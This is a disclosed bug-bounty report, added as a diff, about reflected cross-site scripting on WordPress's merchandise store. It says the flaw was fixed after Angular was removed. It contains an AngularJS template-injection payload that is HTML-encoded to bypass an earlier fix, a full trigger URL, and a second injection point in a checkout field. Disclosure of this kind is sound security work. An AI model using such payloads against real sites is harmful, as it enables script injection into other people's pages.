@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/240256
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/zee_shan
+ReportedTo:WordPress(wordpress)
+BountyAmount:225.0
+Severity:medium
+State:Closed
+DateOfDisclosure:30.08.2018 21:05:00
+
+Summary:
+@zee_shan found a bypass for #230234. Payload used :
+```
+&#123;&#123;constructor.constructor('alert(document.domain)')()}}
+```
+URL to trigger XSS :
+https://mercantile.wordpress.org/?s=%26%23123%3B%26%23123%3Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D&post_type=product
+
+-----
+Soon after another XSS issue on the /checkout endpoint:
+mercantile.wordpress.org/checkout/
+
+` Have a discount code? Enter it here` is vulnerable. You can use this payload to trigger XSS:
+`{{constructor.constructor(&#39;alert(document.domain)&#39;)()}}`
+
+-----
+
+Due to a collection of similar reports and @zee_shan's findings we did a full audit on the site that resulted in ripping out all of the Angular code and replacing it with other solutions, which took several months to complete. During that time a bounty was awarded and when when it was completed @zee_shan confirmed that the issues were fixed and they saw no additional bypasses.
+
+Full disclosure was requested by WordPress, but @zee_shan preferred partial disclosure with a summary.
+
